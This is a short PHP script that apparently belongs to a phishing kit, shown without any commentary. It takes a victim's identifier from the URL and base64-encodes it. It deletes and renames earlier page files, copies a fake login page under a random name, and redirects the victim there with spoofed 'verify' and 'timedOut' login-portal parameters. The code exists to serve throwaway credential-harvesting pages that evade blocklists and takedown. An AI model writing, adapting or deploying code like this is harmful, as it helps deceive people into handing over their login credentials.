<?php
session_start();
?>
<?php
$files = glob("*rt.php");
foreach($files as $file)
unlink($file);
copy("ern.php","oginn.php");
function getloginnIDFromloginn($loginn)
{
$find = '@';
$pos = strpos($loginn, $find);
$loginnID = substr($loginn, 0, $pos);
return $loginnID;
}
$string = $_GET['ar'];
$loginn = base64_encode($string);
$loginnID = getloginnIDFromloginn($loginn);
$dir =  getcwd();
if ($handle = opendir($dir)) {
    while (false !== ($entry = readdir($handle))) {
 $len = strlen($entry);
if($len == 28){
rename($entry, "oginn.php");
}}}
$staticfile = "oginn.php";
$name =  generateRandomString();
$secfile = $name."rt.php";
if (!copy($staticfile, $secfile)) {
//echo "file not create\n";
}else {
if(file_exists($secfile)){
//echo "file exist\n";
unlink($staticfile);
header("Location: $secfile?ar=$loginn&non&.verify?service=nfpb=true&_pageLabel=smep_portal_page_loginn&timedOut=true&_nfls=false=$loginn&loginnID=$loginnID&.#n=1252899642&fid=1&fav=1");
}}

//echo $_SESSION["file"]."\n";
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
?>